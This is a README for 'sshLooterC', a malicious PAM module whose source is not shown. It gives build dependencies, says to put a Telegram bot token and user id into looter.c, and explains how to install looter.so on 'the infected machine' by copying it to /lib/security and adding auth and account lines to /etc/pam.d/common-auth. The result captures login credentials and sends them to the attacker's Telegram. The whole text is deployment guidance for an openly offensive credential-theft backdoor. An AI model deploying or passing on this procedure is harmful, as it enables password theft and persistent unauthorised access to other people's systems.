# sshLooterC

# Dependencies
* root
* brain
* coffe
* gcc
* libcurl4-openssl-dev
* libpam0g-dev


### Debian/Ubuntu

```
apt install libcurl4-openssl-dev
apt install libpam-dev
```

### RedHat/CentOs

```
yum install libcurl-devel
yum install pam-devel
```

# Configure
Edit the `looter.c` and add your telegram bot token and your user id.

# Usage
Copy the `looter.so` to the infected machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and add the following lines.
```
auth optional looter.so
account optional looter.so
```
